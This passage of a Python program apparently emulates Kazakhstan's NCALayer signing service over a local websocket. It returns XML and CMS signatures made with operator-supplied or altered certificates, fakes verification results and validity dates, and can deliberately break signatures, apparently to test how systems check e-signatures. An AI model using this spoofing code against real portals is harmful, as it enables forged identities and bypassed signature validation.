        cert_info['locality'] = cert.subject.get_attributes_for_oid(oid=x509.oid.NameOID.LOCALITY_NAME)[0].value

        # S (Область)
        cert_info['state'] = cert.subject.get_attributes_for_oid(oid=x509.oid.NameOID.STATE_OR_PROVINCE_NAME)[0].value

        # O (Компания)
        cert_info['org'] = cert.subject.get_attributes_for_oid(oid=x509.oid.NameOID.ORGANIZATION_NAME)[0].value

        # OU (БИН)
        cert_info['bin'] = cert.subject.get_attributes_for_oid(oid=x509.oid.NameOID.ORGANIZATIONAL_UNIT_NAME)[0].value


def basic_sign_xml(message):
    """
    Подписать документ XML
    module: kz.gov.pki.knca.basics
    method: sign
    """

    data_to_sign = message['args']['data'].strip()
    if '<?xml' in data_to_sign:
        xml = data_to_sign
        data_to_sign = re.search(r'\?>(.*)$', data_to_sign, flags=re.S).group(1).strip()
    else:
        xml = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>' + data_to_sign

    print("*** Signature request for data:\n" + data_to_sign + '\n')
    insert_position = re.search(r'</(\w+)>$', xml, flags=re.S).start()
    xml = xml[:insert_position] + XML_TMP + xml[insert_position:]
    digest_b64 = base64.b64encode(sha256.new(data_to_sign.encode('utf-8')).digest()).decode()  # SHA256 digest in Base64
    signed_info = SIGNED_INFO % {"DIGEST": digest_b64}
    private_key = rsa.importKey(base64.b64decode(cert_info['privatekey']))

    # RSA подпись для блока SignedInfo
    signature = pkcs1_15.new(private_key).sign(sha256.new(signed_info.encode()))

    if cert_info['breaksignature']:  # Ломаем подпись
        signature = signature[0:-2] + b"\xFF\xFF"

    signature_b64 = base64.b64encode(signature).decode()

    # Заполнеине тела XML
    xml = xml % {"DIGEST": digest_b64,
                 "SIGNATURE": signature_b64,
                 "CERT": cert_info['certificate']}

    json_out = json.loads('{"body":{"result":[""]},"status":true}')
    json_out["body"]["result"] = [xml]

    # Возврат подписи XML-Dsig в JSON
    return json.dumps(json_out)


def basic_sign_cms(message):
    """

    Подписать документ CMS

    module: kz.gov.pki.knca.basics
    method: sign

    """

    print("*** Signature request for data:\n" + message['args']['data'] + '\n')
    data_to_sign = message['args']['data']

    try:
        if message['args']['signingParams']['decode'] == 'true':
            plain_data = False
        else:
            plain_data = True
    except:
        plain_data = True

    if plain_data:
        data_to_sign = data_to_sign.encode()
    else:
        data_to_sign = base64.b64decode(data_to_sign)

    cert = x509.load_der_x509_certificate(base64.b64decode(cert_info['certificate']))
    key = serialization.load_der_private_key(base64.b64decode(cert_info['privatekey']), None)
    options = [pkcs7.PKCS7Options.DetachedSignature, pkcs7.PKCS7Options.NoCapabilities]

    # Подпись RSA сериализованная в PKCS#7 (CMS) и кодированная в Base64
    signature = pkcs7.PKCS7SignatureBuilder().set_data(data_to_sign).add_signer(
        cert, key, hashes.SHA256()).sign(serialization.Encoding.DER, options)

    if cert_info['breaksignature']:  # Ломаем подпись
        signature = signature[0:-2] + b"\xFF\xFF"

    signature = "-----BEGIN CMS-----\n" + insert_newlines(base64.b64encode(signature).decode()) + "\n-----END CMS-----"

    response = json.loads('{"body":{"result":""},"status":true}')
    response['body']['result'] = signature

    # Возврат подписи CMS в JSON
    return json.dumps(response)


def create_cms_signature_from_base64(message):
    """

    Вычислить подпись под данными и сформировать CMS

    module: kz.gov.pki.knca.commonUtils
    method: createCMSSignatureFromBase64

    """

    # TSA not implemented!
    print("*** Signature request for data:\n" + message['args'][2] + '\n')
    data_to_sign = base64.b64decode(message['args'][2].encode())
    cert = x509.load_der_x509_certificate(base64.b64decode(cert_info['certificate']))
    key = serialization.load_der_private_key(base64.b64decode(cert_info['privatekey']), None)
    options = [pkcs7.PKCS7Options.NoCapabilities]
    if not message['args'][3]:
        # Actual data not included in signature (Detached)
        options = options + [pkcs7.PKCS7Options.DetachedSignature]

    # SHA256RSA signature in CMS format
    signature = pkcs7.PKCS7SignatureBuilder().set_data(data_to_sign).add_signer(
        cert, key, hashes.SHA256()).sign(serialization.Encoding.DER, options)

    if cert_info['breaksignature']:  # Ломаем подпись
        signature = signature[0:-2] + b"\xFF\xFF"

    response = json.loads('{"responseObject":"","code":"200"}')
    response["responseObject"] = base64.b64encode(signature).decode()
    return json.dumps(response)


def create_cms_signature_from_base64_Hash(message):
    """

    Вычислить подпись под данными и сформировать CMS

    module: kz.gov.pki.knca.commonUtils
    method: createCAdESFromBase64Hash

    """

    # TSA not implemented!
    print("*** Signature request for data:\n" + message['args'][2] + '\n')
    data_to_sign = base64.b64decode(message['args'][2].encode())
    cert = x509.load_der_x509_certificate(base64.b64decode(cert_info['certificate']))
    key = serialization.load_der_private_key(base64.b64decode(cert_info['privatekey']), None)
    options = [pkcs7.PKCS7Options.NoCapabilities,pkcs7.PKCS7Options.DetachedSignature]

    # SHA256RSA signature in CMS format
    signature = pkcs7.PKCS7SignatureBuilder().set_data(data_to_sign).add_signer(
        cert, key, hashes.SHA256()).sign(serialization.Encoding.DER, options)

    if cert_info['breaksignature']:  # Ломаем подпись
        signature = signature[0:-2] + b"\xFF\xFF"

    response = json.loads('{"responseObject":"","code":"200"}')
    response["responseObject"] = base64.b64encode(signature).decode()
    return json.dumps(response)


def commonutils_sigxml(message):
    """

    Вычислить подпись под документом в формате XML.
    Сформированную подпись добавить в результирующий документ (XMLDSIG).

    module: kz.gov.pki.knca.commonUtils,
    method: signXml

    """

    data_to_sign = message['args'][2].strip()

    #  Костыль для одной из ИС
    if data_to_sign == r"<root/>":
        data_to_sign = r"<root></root>"

    if '<?xml' in data_to_sign:
        xml = data_to_sign
        data_to_sign = re.search(r'\?>(.*)$', data_to_sign, flags=re.S).group(1).strip()
    else:
        xml = '<?xml version="1.0" encoding="utf-8" standalone="no"?>' + data_to_sign

    print("*** Signature request for data:\n" + data_to_sign + '\n')

    if 'SOAP-ENV' in xml:
        #  Костыль для одной из ИС
        xml = xml.replace("<SOAP-ENV:Header/>", "<SOAP-ENV:Header></SOAP-ENV:Header>")
        insert_position = xml.index("</SOAP-ENV:Header>")
    else:
        insert_position = re.search(r'</(\w+)>$', xml, flags=re.S).start()

    xml = xml[:insert_position] + XML_TMP + xml[insert_position:]
    digest_b64 = base64.b64encode(sha256.new(data_to_sign.encode('utf-8')).digest()).decode()  # SHA256 digest in Base64
    signed_info = SIGNED_INFO % {"DIGEST": digest_b64}
    private_key = rsa.importKey(base64.b64decode(cert_info['privatekey']))

    # RSA подпись для блока SignedInfo
    signature = pkcs1_15.new(private_key).sign(sha256.new(signed_info.encode()))

    if cert_info['breaksignature']:  # Ломаем подпись
        signature = signature[0:-2] + b"\xFF\xFF"

    signature_b64 = base64.b64encode(signature).decode()

    # Заполнеине тела XML
    xml = xml % {"DIGEST": digest_b64,
                 "SIGNATURE": signature_b64,
                 "CERT": cert_info['certificate']}  # combine XML body

    json_out = json.loads('{"responseObject":"","code":"200"}')
    json_out["responseObject"] = xml

    # Возврат подписи XML-Dsig в JSON
    return json.dumps(json_out)


def commonutils_sigxmls(message):
    """

    Вычислить подпись под каждым из массива документов в формате XML.
    Сформированную подпись добавить в результирующий документ (XMLDSIG).


    module: kz.gov.pki.knca.commonUtils,
    method: signXmls

    """

    json_out = json.loads('{"responseObject":[],"code":"200"}')

    for filescount in range(0, len(message['args'][2])):
        data_to_sign = message['args'][2][filescount - 1].strip()

        if '<?xml' in data_to_sign:
            xml = data_to_sign
            data_to_sign = re.search(r'\?>(.*)$', data_to_sign, flags=re.S).group(1).strip()
        else:
            xml = '<?xml version="1.0" encoding="utf-8" standalone="no"?>' + data_to_sign

        print("*** Signature request for XML file:\n" + data_to_sign + '\n')

        if 'SOAP-ENV' in xml:
            #  Костыль для одной из ИС
            xml = xml.replace("<SOAP-ENV:Header/>", "<SOAP-ENV:Header></SOAP-ENV:Header>")
            insert_position = xml.index("</SOAP-ENV:Header>")
        else:
            insert_position = re.search(r'</(\w+)>$', xml, flags=re.S).start()

        xml = xml[:insert_position] + XML_TMP + xml[insert_position:]
        digest_b64 = base64.b64encode(
            sha256.new(data_to_sign.encode('utf-8')).digest()).decode()  # SHA256 digest in Base64
        signed_info = SIGNED_INFO % {"DIGEST": digest_b64}
        private_key = rsa.importKey(base64.b64decode(cert_info['privatekey']))

        # RSA подпись для блока SignedInfo
        signature = pkcs1_15.new(private_key).sign(sha256.new(signed_info.encode()))

        if cert_info['breaksignature']:  # Ломаем подпись
            signature = signature[0:-2] + b"\xFF\xFF"

        signature_b64 = base64.b64encode(signature).decode()

        # Заполнеине тела XML
        xml = xml % {"DIGEST": digest_b64,
                     "SIGNATURE": signature_b64,
                     "CERT": cert_info['certificate']}  # combine XML body
        json_out["responseObject"].insert(0, xml)

    # Возврат подписи XML-Dsig в JSON
    return json.dumps(json_out)


def legacy_sigxml(message):
    """

    Вычислить подпись под документом в формате XML.
    Сформированную подпись добавить в результирующий документ (XMLDSIG).

    method: signXml

    """

    data_to_sign = message['args'][3].strip()
    if len(message['args']) == 5:
        data_to_sign = message['args'][4].strip()

    # Костыль для одной из ИС, где в качестве данных для подписания передается кусок JS-кода
    # Дабы не заморачиваться с канонизацией XML
    if "native code" in data_to_sign:
        data_to_sign = '<token>function now() { [native code] }</token>'

    if '<?xml' in data_to_sign:
        data_to_sign = re.search(r'\?>(.*)$', data_to_sign, flags=re.S).group(1).strip()
    xml = '<?xml version="1.0" encoding="utf-8" standalone="no"?>' + data_to_sign

    print("*** Signature request for data:\n" + data_to_sign + '\n')
    insert_position = re.search(r'</(\w+)>$', xml, flags=re.S).start()
    xml = xml[:insert_position] + XML_TMP + xml[insert_position:]
    digest_b64 = base64.b64encode(sha256.new(data_to_sign.encode('utf-8')).digest()).decode()  # SHA256 digest in Base64
    signed_info = SIGNED_INFO % {"DIGEST": digest_b64}
    private_key = rsa.importKey(base64.b64decode(cert_info['privatekey']))

    # RSA подпись для блока SignedInfo
    signature = pkcs1_15.new(private_key).sign(sha256.new(signed_info.encode()))

    if cert_info['breaksignature']:  # Ломаем подпись
        signature = signature[0:-2] + b"\xFF\xFF"

    signature_b64 = base64.b64encode(signature).decode()

    # Заполнеине тела XML
    xml = xml % {"DIGEST": digest_b64,
                 "SIGNATURE": signature_b64,
                 "CERT": cert_info['certificate']}  # combine XML body
    json_out = json.loads(
        '{"result":"","errorCode": "NONE"}')
    json_out["result"] = xml
    json_out = re.sub(r'\\n', r'\\r\\n', json.dumps(json_out))

    # Возврат подписи XML-Dsig в JSON
    return json_out


def legacy_sign_plain_data(message):
    """

    Подписать строку в формате UTF-8.

    method: signPlainData

    """

    data_to_sign = message['args'][4]

    print("*** Signature request for data:\n" + data_to_sign + '\n')
    private_key = rsa.importKey(base64.b64decode(cert_info['privatekey']))

    # RSA подпись для данных
    signature = pkcs1_15.new(private_key).sign(sha256.new(data_to_sign.encode()))

    if cert_info['breaksignature']:  # Ломаем подпись
        signature = signature[0:-2] + b"\xFF\xFF"

    signature_b64 = base64.b64encode(signature).decode()

    json_out = json.loads(
        '{"result":"","errorCode": "NONE"}')
    json_out["result"] = signature_b64

    # Возврат подписи в JSON
    return json.dumps(json_out)


def legacy_get_subject_dn():
    """

    Получить уникальное имя субъекта (владельца) сертификата.

    method: getSubjectDN
    """

    # Шаблон DN юридического лица
    ent_dn = r'CN=%(subjectCn)s,SURNAME=%(surname)s,SERIALNUMBER=IIN%(iin)s,C=%(country)s,' \
             r'L=%(locality)s,ST=%(state)s,O=%(org)s,OU=BIN%(bin)s,GIVENNAME=%(givenname)s,E=%(email)s'

    # Шаблон DN физического лица
    ind_dn = r'CN=%(subjectCn)s,SURNAME=%(surname)s,SERIALNUMBER=IIN%(iin)s,C=%(country)s,G=%(givenname)s,E=%(email)s'

    if cert_info['type'] == 'ind':
        dn = ind_dn % {'subjectCn': cert_info['commonname'],
                       'surname': cert_info['surname'],
                       'iin': cert_info['iin'],
                       'country': cert_info['country'],
                       'givenname': cert_info['givenname'],
                       'email': cert_info['email']}
    else:
        dn = ent_dn % {'subjectCn': cert_info['commonname'],
                       'surname': cert_info['surname'],
                       'iin': cert_info['iin'],
                       'country': cert_info['country'],
                       'locality': cert_info['locality'],
                       'state': cert_info['state'],
                       'org': cert_info['org'],
                       'bin': cert_info['bin'],
                       'givenname': cert_info['givenname'],
                       'email': cert_info['email']}
    return dn


def commonutils_getkeyinfo(cert_info, UUID=None):
    """

    Получить информацию об одной записи (ключевой паре с сертификатом).

    module: kz.gov.pki.knca.commonUtils
    method: getKeyInfo
    """

    # Шаблон DN юридического лица
    ent_dn = r'CN=%(subjectCn)s,SURNAME=%(surname)s,SERIALNUMBER=IIN%(iin)s,C=%(country)s,' \
             r'L=%(locality)s,ST=%(state)s,O=%(org)s,OU=BIN%(bin)s,GIVENNAME=%(givenname)s,E=%(email)s'

    # Шаблон DN физического лица
    ind_dn = r'CN=%(subjectCn)s,SURNAME=%(surname)s,SERIALNUMBER=IIN%(iin)s,C=%(country)s,G=%(givenname)s,E=%(email)s'

    # Шаблон ответа JSON
    response_tmp = '''{
    "responseObject": {
        "certNotBefore": "",
        "issuerCn": "ҰЛТТЫҚ КУӘЛАНДЫРУШЫ ОРТАЛЫҚ (RSA)",
        "authorityKeyIdentifier": "5b6a7411",
        "serialNumber": "",
        "certNotAfter": "",
        "issuerDn": "C=KZ,CN=ҰЛТТЫҚ КУӘЛАНДЫРУШЫ ОРТАЛЫҚ (RSA)",
        "keyId": "",
        "alias": "",
        "pem": "",
        "subjectCn": "",
        "algorithm": "RSA",
        "subjectDn": ""
    },"code": "200"}'''

    pem = "-----BEGIN CERTIFICATE-----\n%(CERT)s\n-----END CERTIFICATE-----"
    pem = pem % {"CERT": cert_info['certificate']}

    if cert_info['type'] == 'ind':
        dn = ind_dn % {'subjectCn': cert_info['commonname'],
                       'surname': cert_info['surname'],
                       'iin': cert_info['iin'],
                       'country': cert_info['country'],
                       'givenname': cert_info['givenname'],
                       'email': cert_info['email']}
    else:
        dn = ent_dn % {'subjectCn': cert_info['commonname'],
                       'surname': cert_info['surname'],
                       'iin': cert_info['iin'],
                       'country': cert_info['country'],
                       'locality': cert_info['locality'],
                       'state': cert_info['state'],
                       'org': cert_info['org'],
                       'bin': cert_info['bin'],
                       'givenname': cert_info['givenname'],
                       'email': cert_info['email']}

    response_object = json.loads(response_tmp)

    # Идентификаторы сертификата
    response_object['responseObject']['serialNumber'] = cert_info['serialNumber']
    response_object['responseObject']['keyId'] = cert_info['keyId']
    response_object['responseObject']['alias'] = cert_info['keyId']

    # Время действия сертификата установливается на 180 дней в обе стороны от текущей даты
    response_object['responseObject']['certNotBefore'] = int(time.time()) * 1000 - 15500000000
    response_object['responseObject']['certNotAfter'] = int(time.time()) * 1000 + 15500000000

    response_object['responseObject']['pem'] = pem
    response_object['responseObject']['subjectCn'] = cert_info['commonname']
    response_object['responseObject']['subjectDn'] = dn

    if UUID is not None:
        response_object['uuid'] = UUID

    json_out = re.sub(r'\\n', r'\\r\\n', json.dumps(response_object, ensure_ascii=False))
    return json_out


async def websocket_handler(websocket):
    # Обработка сообщений от websocket клиента

    print("*** Incoming connection from: " + websocket.request_headers["Origin"])

    await websocket.send('{"result":{"version": "1.3"}}')
    while True:
        try:
            response = ''
            raw_message = await websocket.recv()

            # Heartbeat handle
            if raw_message == '--heartbeat--':
                await websocket.send('--heartbeat--')
                continue
            else:
                message = json.loads(raw_message)

            # Handle NCALayer's methods
            if ('method' in raw_message) and not ('module' in raw_message):
                # Legacy 'kz.gov.pki.knca.applet.Applet' module
                match message['method']:
                    case 'browseKeyStore':
                        print("*** Invoking legacy method: browseKeyStore")
                        await websocket.send(
                            # Make random file name
                            r'{"result": "c:\\AUTH_RSA256_' + ''.join(random.choice(
                                'abcde1234567890') for _ in range(40)) + r'.p12","errorCode": "NONE"}')
                        continue
                    case 'loadSlotList':
                        print("*** Invoking legacy method: loadSlotList")
                        await websocket.send(r'{"errorCode":"EMPTY_SLOT"}')
                        continue
                    case 'verifyXml':
                        print("*** Invoking legacy method: verifyXml")
                        await websocket.send(r'{"result":true,"errorCode":"NONE"}')
                        continue
                    case 'getKeys':
                        print("*** Invoking legacy method: getKeys")
                        await websocket.send(
                            r'{"result": "RSA|' + cert_info['commonname'] + '|' +
                            cert_info['serialNumber'] + '|' + cert_info['keyId'] + '",'
                            r'"errorCode": "NONE"}')
                        continue
                    case 'getSubjectDN':
                        print("*** Invoking legacy method: getSubjectDN")
                        await websocket.send(r'{"result": "' + legacy_get_subject_dn() +
                                             r'","errorCode": "NONE"}')
                        continue
                    case 'getNotAfter':
                        print("*** Invoking legacy method: getNotAfter")
                        await websocket.send(r'{"result": "' +
                                             (datetime.now() + timedelta(days=180)).strftime("%d.%m.%Y %H:%M:%S") +
                                             r'","errorCode": "NONE"}')
                        continue
                    case 'getNotBefore':
                        print("*** Invoking legacy method: getNotBefore")
                        await websocket.send(r'{"result": "' +
                                             (datetime.now() - timedelta(days=180)).strftime("%d.%m.%Y %H:%M:%S") +
                                             r'","errorCode": "NONE"}')
                        continue
                    case 'signXml':
                        print("*** Invoking legacy method: signXml")
                        response = legacy_sigxml(message)
                    case 'signPlainData':
                        print("*** Invoking legacy method: signPlainData")
                        response = legacy_sign_plain_data(message)

            # regular module
            else:
                match message['module']:

                    # Module kz.gov.pki.knca.basics
                    case 'kz.gov.pki.knca.basics':
                        match message['args']['format']:
                            case 'xml':
                                print("*** Invoking method " + message['module'] + "." +
                                      message['method'] + 'in xml format')
                                response = basic_sign_xml(message)
                            case 'cms':
                                print("*** Invoking method " + message['module'] + "." +
                                      message['method'] + 'in cms format')
                                response = basic_sign_cms(message)

                    # Module kz.gov.pki.knca.commonUtils
                    case 'kz.gov.pki.knca.commonUtils':
                        match message['method']:
                            case 'signXml':
                                print("*** Invoking method: " + message['module'] + "." + message['method'])
                                response = commonutils_sigxml(message)
                            case 'signXmls':
                                print("*** Invoking method: " + message['module'] + "." + message['method'])
                                response = commonutils_sigxmls(message)
                            case 'createCMSSignatureFromBase64':
                                print("*** Invoking method: " + message['module'] + "." + message['method'])
                                response = create_cms_signature_from_base64(message)
                            case 'createCAdESFromBase64':
                                print("*** Invoking method: " + message['module'] + "." + message['method'])
                                response = create_cms_signature_from_base64(message)
                            case 'createCAdESFromBase64Hash':
                                print("*** Invoking method: " + message['module'] + "." + message['method'])
                                response = create_cms_signature_from_base64_Hash(message)
                            case 'getKeyInfo':
                                print("*** Invoking method: " + message['module'] + "." + message['method'])
                                response = commonutils_getkeyinfo(
                                    cert_info, message['uuid'] if 'uuid' in raw_message else None
                                )
                            case 'getActiveTokens':
                                response = '{"code":"200","responseObject":["PKCS12"]}'

                    case 'kz.gov.pki.ncalayerservices.accessory':
                        match message['method']:
                            case 'getBundles':
                                print("*** Invoking method: " + message['module'] + "." + message['method'])
                                # Установленные модули
                                response = '{' \
                                           '"org.apache.felix.framework":"7.0.3",' \
                                           '"kz.gov.pki.api.layer.NCALayerServices":"0.7.1",' \
                                           '"kz.inessoft.kgd.knp.sono_knp_ncalayer_module":"1.2.0",' \
                                           '"kz.gov.pki.osgi.layer.websocket":"0.3.8","kz.ecc.NurSignBundle":"4.3.1",' \
                                           '"kz.ecc.MarketSignBundle":"1.0.7",' \
                                           '"kz.gov.pki.osgi.layer.common":"0.3.4",' \
                                           '"kz.gov.pki.knca.applet.knca_applet":"0.4.6",' \
                                           '"kz.gov.pki.kalkan.xmldsig":"0.4.0",' \
                                           '"kz.ecc.K2SignBundle":"1.1.5",' \
                                           '"kz.sapa.eproc.osgi.EprocModule":"1.0.0",' \
                                           '"com.osdkz.esf.signer":"1.2.0",' \
                                           '"kz.gov.pki.provider.knca_provider_util":"0.8.5",' \
                                           '"kz.gov.pki.kalkan.knca_provider_jce_kalkan":"0.7.5"' \
                                           '}'
                    case 'kz.digiflow.mobile.extensions':
                        match message['method']:
                            case 'getVersion':
                                response = '{"success": false,"errorCode": "MODULE_NOT_FOUND"}'

                    case _:
                        print("*** Unsupported request:\n" + json.dumps(message) + '\n')
                        continue

            if response != '':
                if not cert_info['dontsend']:
                    if cert_info['delay'] > 0:
                        print(f"*** Delay {cert_info['delay']}s...")
                        await asyncio.sleep(cert_info['delay'])

                    print("*** Response sent:\n" + response + '\n')
                    await websocket.send(response)
                else:
                    print("*** Response print:\n\n" + response + '\n')
            else:
                print('*** Sign error!')
                continue
        except websockets.ConnectionClosedOK:
            print('*** Connection closed.')
            break
        except asyncio.exceptions.IncompleteReadError:
            break
        except websockets.exceptions.ConnectionClosedError:
            print('*** Connection closed.')
            break


async def main(argv):
    # global altered_cert
    global cert_info
    cert_info = get_cert_params(argv)

    if cert_info['type'] == "file":
        load_from_file(cert_info)
    else:
        get_altered_cert(cert_info)

    try:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain("localhost.crt", keyfile="localhost.key ")
        signal.signal(signal.SIGINT, signal.SIG_DFL)

        # Запуск websockeet сервера
        async with websockets.serve(websocket_handler, "127.0.0.1", 13579, ssl=ssl_context):
            print("FCALayer Waiting for requests...")
            await asyncio.Future()  # run forever
    except requests.exceptions.RequestException as e:
        print('Connection error: ')
        raise SystemExit(e)
    except OSError as e:
        if e.errno == 10048:
            print('Close NCALayer, port 13579 in use')
        else:
            raise SystemExit(e.errno)


if __name__ == "__main__":
    asyncio.run(main(sys.argv[1:]))
